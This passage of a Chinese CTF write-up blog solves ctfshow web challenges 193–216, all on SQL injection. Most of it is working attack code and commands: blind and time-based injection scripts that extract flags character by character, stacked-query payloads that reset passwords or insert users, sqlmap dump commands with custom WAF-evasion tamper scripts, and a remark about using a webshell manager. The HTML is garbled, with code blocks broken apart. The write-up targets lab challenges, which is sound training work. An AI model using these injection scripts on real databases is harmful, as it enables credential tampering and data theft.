class="hljs-keyword">in</span> letter:<br>          payload = <span class="hljs-string">&quot;&#x27; or if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;,1,0) =&#x27;1&quot;</span>.format(flag+j+<span class="hljs-string">&quot;%&quot;</span>)<br>          data=&#123;<br>              <span class="hljs-string">&#x27;username&#x27;</span>:payload,<br>              <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-number">1</span><br>          &#125;<br>          res = requests.post(url=url,data=data)<br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;密码错误&quot;</span> == res.json()[<span class="hljs-string">&#x27;msg&#x27;</span>]:<br>              flag += j<br>              print(flag)<br>              <span class="hljs-keyword">break</span><br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#125;&quot;</span> <span class="hljs-keyword">in</span> flag:<br>              sys.<span class="hljs-keyword">exit</span>()<br>  <br></code></pre></td></tr></table></figure></li></ul><h3 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h3><ul><li><p>web193的立刻依旧可以打</p></li><li><p>来点新姿势</p></li><li><p><code>LOCATE(substr,string)</code><br>返回字符串<code>string</code>中<strong>第一次</strong>出现子字符串的位置 <code>subtr</code>，从1开始计数<br>例如：SELECT LOCATE(‘2’, ‘123’) 返回 2</p></li><li><p>&#96;&#96;&#96;python<br>import requests</p></li></ul><h1 id="应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND-IN-SET、IN、LIKE"><a href="#应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND-IN-SET、IN、LIKE" class="headerlink" title="应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE"></a>应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE</h1><p>  url &#x3D; “<a href="http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/&quot;">http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/&quot;</a><br>  final &#x3D; “”<br>  stttr &#x3D; “flag{}-_1234567890qwertyuiopsdhjkzxcvbnm”<br>  for i in range(1,45):<br>      for j in stttr:<br>          final +&#x3D; j<br>          # 查表名-ctfshow_flxg<br>          # payload &#x3D; f”admin’ and if(locate(‘{final}’,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;1,1,2)&#x3D;’1”<br>          # 查字段-f1ag<br>          # payload &#x3D; f”admin’ and if(locate(‘{final}’,(select column_name from information_schema.columns where table_name&#x3D;’ctfshow_flxg’ limit 1,1))&#x3D;1,1,2)&#x3D;’1”<br>          payload &#x3D; f”admin’ and if(locate(‘{final}’,(select f1ag from ctfshow_flxg limit 0,1))&#x3D;1,1,2)&#x3D;’1”<br>          data &#x3D; {<br>              ‘username’: payload,<br>              ‘password’: ‘1’<br>          }<br>          r &#x3D; requests.post(url,data&#x3D;data)<br>          if “密码错误” &#x3D;&#x3D; r.json()[‘msg’]:<br>              print(final)<br>          else:<br>              final &#x3D; final[:-1]<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-section">### web195</span><br><br><span class="hljs-bullet">-</span> 题目中看到过滤了select<br><br><span class="hljs-bullet">-</span> 提示使用update<br><br><span class="hljs-bullet">-</span> 那么在用户名一栏输入<br><br></code></pre></td></tr></table></figure><br>  0;update<code>ctfshow_user</code>set<code>pass</code>&#x3D;(1)<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>  相当于修改密码<br><br><span class="hljs-bullet">-</span> 然后0 1登录成功<br><br><span class="hljs-section">### web196</span><br><br><span class="hljs-bullet">-</span> 关键之处：<span class="hljs-code">`$row[0]==$password`</span><br><span class="hljs-bullet">-</span> 用户名：1;select(1);l<br><span class="hljs-bullet">-</span> 密码：1<br><br><span class="hljs-section">### web197</span><br><br><span class="hljs-bullet">-</span> 过滤了update<br><br><span class="hljs-bullet">-</span> 使用insert<br><br><span class="hljs-bullet">-</span> 那么在用户名一栏输入<br><br></code></pre></td></tr></table></figure><br>  0;<code>ctfshow_user</code>value(123,123,123)<br>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>- 再用户名密码123 123登录<br><br><span class="hljs-comment">### web198</span><br><br>- 同197<br><br><span class="hljs-comment">### web199～200</span><br><br>- 用户名：0;show tables;<br>- 密码：ctfshow_user<br><br><span class="hljs-comment">### web201</span><br><br>- sqlmap<br><br>- ```<br>  sqlmap -u <span class="hljs-string">&quot;http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id=&quot;</span>  <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show --dbs<br>  <br>  sqlmap -u <span class="hljs-string">&quot;http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id=&quot;</span>  <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web --tables<br>  <br>  sqlmap -u <span class="hljs-string">&quot;http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id=&quot;</span>  <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --columns<br>  <br>  sqlmap -u <span class="hljs-string">&quot;http://8e663fa9-ca2c-4173-b948-6761f3e6c2e6.challenge.ctf.show/api/?id=&quot;</span>  <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--referer</span>=ctf.show -D ctfshow_web -T ctfshow_user --dump<br>  <br></code></pre></td></tr></table></figure></p><h3 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h3><ul><li><p>使用–data调整sqlmap的请求方式</p></li><li><p>&#96;&#96;&#96;<br>sqlmap -u <a href="http://fcef3bbc-e7a2-4ea3-8f41-cd3a93cfc00c.challenge.ctf.show/api/index.php">http://fcef3bbc-e7a2-4ea3-8f41-cd3a93cfc00c.challenge.ctf.show/api/index.php</a> –data “id&#x3D;1” –us<br>er-agent&#x3D;sqlmap –referer&#x3D;ctf.show -D ctfshow_web -T ctfshow_user –dump</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><br>### web203<br><br>- --<span class="hljs-built_in">method</span>修改方法<br>- --header添加请求头<br><br>- ```<br>  sqlmap -u http://<span class="hljs-number">08d77122</span>-b80d-<span class="hljs-number">49b0</span>-85d5-42c346888722.challenge.ctf.<span class="hljs-built_in">show</span>/api/index.php --<span class="hljs-built_in">method</span>=<span class="hljs-built_in">put</span> --header=Content-Type:text/plain --data <span class="hljs-string">&quot;id=1&quot;</span> --user-agent=sqlmap --referer=ctf.<span class="hljs-built_in">show</span> -D ctfshow_web -T ctfshow_user --dump<br></code></pre></td></tr></table></figure></li></ul><h3 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h3><ul><li><p>–cookie可以添加cookie</p></li><li><p>&#96;&#96;&#96;<br>sqlmap -u <a href="http://961b7f7b-d646-4823-88b2-aceead519fe4.challenge.ctf.show/api/index.php">http://961b7f7b-d646-4823-88b2-aceead519fe4.challenge.ctf.show/api/index.php</a> –method&#x3D;put –header&#x3D;Content-Type:text&#x2F;plain cookie&#x3D;”PHPSESSID&#x3D;1koef7it9pk0fo0b62tk2888tb” –data “id&#x3D;1” –user-agent&#x3D;sqlmap –referer&#x3D;ctf.show -D ctfshow_web -T ctfshow_user –dump</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web205</span><br><br>- 提示：api需要鉴权<br><br>- 通过抓包分析，在每次请求`url<span class="hljs-regexp">/api/i</span>ndex.php`之前需要先请求`URL<span class="hljs-regexp">/api/g</span>etTokn.php<br><br>- **--safe-url 设置在测试目标地址前访问的安全链接**<br>   **--safe-freq 设置两次注入测试前访问安全链接的次数**<br><br>- ```<br>  sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">85</span>fe947b-<span class="hljs-number">518</span>c-<span class="hljs-number">450</span>c-<span class="hljs-number">8335</span>-ac69a6a59b78.chall.ctf.show<span class="hljs-regexp">/api/i</span>ndex.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --dbms=mysql dbs=ctfshow_web -T ctfshow_flax -C flagx --dump  --headers=<span class="hljs-string">&quot;Content-Type: text/plain&quot;</span> --safe-url=http:<span class="hljs-regexp">//</span><span class="hljs-number">85</span>fe947b-<span class="hljs-number">518</span>c-<span class="hljs-number">450</span>c-<span class="hljs-number">8335</span>-ac69a6a59b78.chall.ctf.show<span class="hljs-regexp">/api/g</span>etToken.php --safe-freq=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h3><ul><li><p>提示：sql需要闭合</p></li><li><pre><code class="hljs">sqlmap -u http://303329b7-8627-41d9-9e71-45a218a61c49.chall.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql -D &quot;ctfshow_web&quot; -T &quot;ctfshow_flaxc&quot; -C &quot;flagv&quot; --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://303329b7-8627-41d9-9e71-45a218a61c49.chall.ctf.show/api/getToken.php --safe-freq=1<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>### web207<br><br>- tamper的编写https://y4er.com/post/sqlmap-tamper/<br><br>- 列一下sqlmap自带的tamper<br><br>- ```<br>  space2comment.py用<span class="hljs-comment">/**/</span>代替空格<br>   <br>  apostrophemask.py用utf8代替引号<br>   <br>  equaltolike.pylike代替等号<br>   <br>  space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）<br>   <br>  greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。<br>   <br>  space2hash.py空格替换为#号,随机字符串以及换行符<br>   <br>  apostrophenullencode.py绕过过滤双引号，替换字符和双引号。<br>   <br>  halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论<br>   <br>  space2morehash.py空格替换为 #号 以及更多随机字符串 换行符<br>   <br>  appendnullbyte.py在有效负荷结束位置加载零字节字符编码<br>   <br>  ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">ISNULL</span>(A), B, A)’<br>   <br>  space2mssqlblank.py(mssql)空格替换为其它空符号<br>   <br>  base64encode.py　用base64编码替换<br>   <br>  space2mssqlhash.py　替换空格<br>   <br>  modsecurityversioned.py过滤空格，包含完整的查询版本注释<br>   <br>  space2mysqlblank.py　空格替换其它空白符号(mysql)<br>   <br>  <span class="hljs-keyword">between</span>.py用<span class="hljs-keyword">between</span>替换大于号（&gt;）<br>   <br>  space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）<br>   <br>  multiplespaces.py围绕<span class="hljs-keyword">SQL</span>关键字添加多个空格<br>   <br>  space2plus.py用+替换空格<br>   <br>  bluecoat.py代替空格字符后与一个有效的随机空白字符的<span class="hljs-keyword">SQL</span>语句,然后替换=为<span class="hljs-keyword">like</span><br>   <br>  nonrecursivereplacement.py双重查询语句,取代<span class="hljs-keyword">SQL</span>关键字<br>   <br>  space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集<br>   <br>  sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾<br>   <br>  chardoubleencode.py双url编码(不处理以编码的)<br>   <br>  unionalltounion.py替换<span class="hljs-keyword">UNION</span> ALLSELECT <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span><br>   <br>  charencode.py　url编码<br>   <br>  randomcase.py随机大小写<br>   <br>  unmagicquotes.py宽字符绕过 GPCaddslashes<br>   <br>  randomcomments.py用<span class="hljs-comment">/**/</span>分割<span class="hljs-keyword">sql</span>关键字<br>   <br>  charunicodeencode.py字符串 unicode 编码<br>   <br>  securesphere.py追加特制的字符串<br>   <br>  versionedmorekeywords.py注释绕过<br>   <br>  space2comment.py替换空格字符串(‘‘) 使用注释‘<span class="hljs-comment">/**/</span>’<br>   <br>  halfversionedmorekeywords.py关键字前加注释<br></code></pre></td></tr></table></figure></code></pre></li><li><p>开始分析这题，首先它过滤了空格</p></li><li><p>选择space2</p></li><li><p>&#96;&#96;&#96;<br>sqlmap -u “<a href="http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/index.php&quot;">http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/index.php&quot;</a> –user-agent&#x3D;sqlmap –method&#x3D;PUT –data “id&#x3D;1” –referer&#x3D;ctf.show –headers&#x3D;Content-Type:text&#x2F;plain –cookie&#x3D;”PHPSESSID&#x3D;0s10857oppg126l47tnkfvgdnt” –safe-url&#x3D;”<a href="http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/getToken.php&quot;">http://22a17c53-2712-4184-ab0c-e9548c21fff0.challenge.ctf.show/api/getToken.php&quot;</a> –safe-freq&#x3D;1 –tamper&#x3D;space2comment -D ctfshow_web -T ctfshow_flaxca –dump</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><br><span class="hljs-comment">### web208</span><br><br>- 过滤了select<br>- 可以随机大小写绕过（randomcase.py）,多个tamper用`,`分隔<br><br>- ```<br>  sqlmap -u http:<span class="hljs-string">//9cd7a826-e21c-4097-8d19-a2f8ecba5406.challenge.ctf.show/api/index.php</span> <span class="hljs-params">--safe-url=http</span>:<span class="hljs-string">//9cd7a826-e21c-4097-8d19-a2f8ecba5406.challenge.ctf.show/api/getToken.php</span> <span class="hljs-params">--safe-freq=1</span> -method=PUT <span class="hljs-params">--headers=</span><span class="hljs-string">&quot;Content-Type: text/plain&quot;</span> <span class="hljs-params">--data=</span><span class="hljs-string">&quot;id=1&quot;</span> <span class="hljs-params">--dbms=mysql</span> <span class="hljs-params">--current-db</span> <span class="hljs-params">--tables</span>  -T ctfshow_flaxcac  <span class="hljs-params">--dump</span>  <span class="hljs-params">--level=3</span> <span class="hljs-params">--tamper=</span><span class="hljs-string">&quot;space2comment,randomcase&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h3><ul><li><p>过滤了&#x3D;和*</p></li><li><p>自定义一个tamper文件（文件名为ctfshow209）放到tamper目录里</p></li><li><p>&#96;&#96;&#96;python<br>#!&#x2F;usr&#x2F;bin&#x2F;env python</p><p>from lib.core.compat import xrange<br>from lib.core.enums import PRIORITY</p><p><strong>priority</strong> &#x3D; PRIORITY.LOW</p><p>def dependencies():<br>pass<br>def tamper(payload, **kwargs):</p><pre><code class="hljs">retVal = payloadretVal = retVal.replace(&quot;=&quot;, &quot; like &quot;)retVal = retVal.replace(&quot; &quot;, chr(0x0a))return retVal</code></pre><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>  <br><br>- ```<br>  sqlmap -u <span class="hljs-string">&quot;http://2e264752-738d-4f96-bfc1-22cc9ef6f354.challenge.ctf.show/api/index.php&quot;</span> <span class="hljs-attribute">--user-agent</span>=sqlmap <span class="hljs-attribute">--method</span>=PUT --data <span class="hljs-string">&quot;id=1&quot;</span> <span class="hljs-attribute">--referer</span>=ctf.show <span class="hljs-attribute">--headers</span>=Content-Type:text/plain <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=l6jirkfhuubl7tfv95ah7p9ijv&quot;</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">&quot;http://2e264752-738d-4f96-bfc1-22cc9ef6f354.challenge.ctf.show/api/getToken.php&quot;</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--tamper</span>=ctfshow209 -D ctfshow_web -T ctfshow_flav --dump<br></code></pre></td></tr></table></figure></li></ul><h3 id="web210～212"><a href="#web210～212" class="headerlink" title="web210～212"></a>web210～212</h3><ul><li><p>&#96;&#96;&#96;python<br>from lib.core.compat import xrange<br>from lib.core.enums import PRIORITY<br>import base64<br><strong>priority</strong> &#x3D; PRIORITY.LOW</p><p>def tamper(payload, *<em>kwargs):<br>payload &#x3D; space2comment(payload)<br>retVal &#x3D; “”<br>if payload:<br>    retVal &#x3D; base64.b64encode(payload[::-1].encode(‘utf-8’))<br>    retVal &#x3D; base64.b64encode(retVal[::-1]).decode(‘utf-8’)<br>return retVal<br>def space2comment(payload):<br>retVal &#x3D; payload<br>if payload:<br>    retVal &#x3D; “”<br>    quote, doublequote, firstspace &#x3D; False, False, False<br><br>    for i in xrange(len(payload)):<br>        if not firstspace:<br>            if payload[i].isspace():<br>                firstspace &#x3D; True<br>                retVal +&#x3D; chr(0x0a)<br>                continue<br><br>        elif payload[i] &#x3D;&#x3D; ‘&#39;‘:<br>            quote &#x3D; not quote<br><br>        elif payload[i] &#x3D;&#x3D; ‘“‘:<br>            doublequote &#x3D; not doublequote<br><br>        elif payload[i] &#x3D;&#x3D; “</em>“:<br>            retVal +&#x3D; chr(0x31)<br>            continue<br><br>        elif payload[i] &#x3D;&#x3D; “&#x3D;”:<br>            retVal +&#x3D; chr(0x0a)+’like’+chr(0x0a)<br>            continue<br><br>        elif payload[i] &#x3D;&#x3D; “ “ and not doublequote and not quote:<br>            retVal +&#x3D; chr(0x0a)<br>            continue<br><br>        retVal +&#x3D; payload[i]<br><br>return retVal</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">213</span><br><br>- 参考了大佬文章但是做后我的sqlmap直接写入文件<br>- https://blog.csdn.net/jiangdie<span class="hljs-number">666</span>/article/details/<span class="hljs-number">117822681</span>?csdn_share_tail<span class="hljs-operator">=</span><span class="hljs-variable">%7</span>B<span class="hljs-variable">%22</span><span class="hljs-keyword">type</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>blog<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%22</span>rType<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>article<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%22</span>rId<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22117822681</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%22</span>source<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>m<span class="hljs-number">0</span>_<span class="hljs-number">61206225</span><span class="hljs-variable">%22</span><span class="hljs-variable">%7</span>D&amp;ctrtid<span class="hljs-operator">=</span>rcVln<br>- 后面我就直接中国蚁剑了<br><br>### web<span class="hljs-number">214</span><br><br>- 注入点是ip和debug<br><br>- ```python<br>  import requests<br>  <br>  url <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://10cbe042-251f-4173-9e79-16bf7e99a599.challenge.ctf.show/api/&quot;</span><br>  <br>  result <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>  i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>  while True:<br>      i <span class="hljs-operator">=</span> i + <span class="hljs-number">1</span><br>      head <span class="hljs-operator">=</span> <span class="hljs-number">32</span><br>      <span class="hljs-keyword">tail</span> <span class="hljs-operator">=</span> <span class="hljs-number">127</span><br>  <br>      while head &lt; <span class="hljs-keyword">tail</span>:<br>          mid <span class="hljs-operator">=</span> (head + <span class="hljs-keyword">tail</span>) &gt;&gt; <span class="hljs-number">1</span><br>          # 查数据库<br>          # payload <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>          # 查列名字-id.flag<br>          # payload <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;&quot;</span><br>          # 查数据<br>          payload <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select flaga from ctfshow_flagx&quot;</span><br>          data <span class="hljs-operator">=</span> &#123;<br>              &#x27;ip&#x27;: f<span class="hljs-string">&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;</span><span class="hljs-punctuation">,</span><br>              &#x27;debug&#x27;:&#x27;<span class="hljs-number">0</span>&#x27;<br>          &#125;<br><span class="hljs-symbol">          try:</span><br>              r <span class="hljs-operator">=</span> requests.post(url<span class="hljs-punctuation">,</span> data<span class="hljs-operator">=</span>data<span class="hljs-punctuation">,</span> timeout<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br>              <span class="hljs-keyword">tail</span> <span class="hljs-operator">=</span> mid<br>          except Exception as e:<br>              head <span class="hljs-operator">=</span> mid + <span class="hljs-number">1</span><br>  <br>      if head !<span class="hljs-operator">=</span> <span class="hljs-number">32</span>:<br>          result +<span class="hljs-operator">=</span> chr(head)<br><span class="hljs-symbol">      else:</span><br>          break<br>      print(result)<br></code></pre></td></tr></table></figure></li></ul><h3 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h3><ul><li><p>多了一个’</p></li><li><p>&#96;&#96;&#96;python<br>import requests</p><p>url &#x3D; “<a href="http://752fc45b-8355-4eb0-a7ae-a421504f129f.challenge.ctf.show/api/&quot;">http://752fc45b-8355-4eb0-a7ae-a421504f129f.challenge.ctf.show/api/&quot;</a></p><p>result &#x3D; ‘’</p></li></ul><h1 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h1><h1 id="payload-x3D-“select-group-concat-table-name-from-information-schema-tables-where-table-schema-x3D-database-”"><a href="#payload-x3D-“select-group-concat-table-name-from-information-schema-tables-where-table-schema-x3D-database-”" class="headerlink" title="payload &#x3D; “select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()”"></a>payload &#x3D; “select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()”</h1><h1 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h1><h1 id="payload-x3D-“select-group-concat-column-name-from-information-schema-columns-where-table-schema-x3D-database-and-table-name-x3D-’ctfshow-flagxc’”"><a href="#payload-x3D-“select-group-concat-column-name-from-information-schema-columns-where-table-schema-x3D-database-and-table-name-x3D-’ctfshow-flagxc’”" class="headerlink" title="payload &#x3D; “select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’ctfshow_flagxc’”"></a>payload &#x3D; “select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’ctfshow_flagxc’”</h1><p>  #爆字段值<br>  payload &#x3D; “select flagaa from <code>ctfshow_flagxc</code>“</p><p>  for i in range(1,50):<br>      head &#x3D; 32<br>      tail &#x3D; 127</p><pre><code class="hljs">  while head &lt; tail:      mid = (head + tail) &gt;&gt; 1 # 中间指针等于头尾指针相加的一半      # print(mid)      data = &#123;          &#39;ip&#39; : f&quot;&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)#&quot;,          &#39;debug&#39; : &#39;0&#39;      &#125;      try:          r = requests.post(url, data, timeout=0.8)          tail = mid      except:          head = mid + 1 #sleep导致超时  if head != 32:      result += chr(head)      print(result)  else:      break</code></pre>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">### web216</span><br><br>- 用)闭合括号<br><br>- ```python<br>  import requests<br>  <br>  url = <span class="hljs-string">&quot;http://99a498fc-f8ae-40ed-9f5b-dad355a13148.challenge.ctf.show/api/&quot;</span><br>  <br>  result = <span class="hljs-string">&#x27;&#x27;</span><br>  <br>  <span class="hljs-comment"># 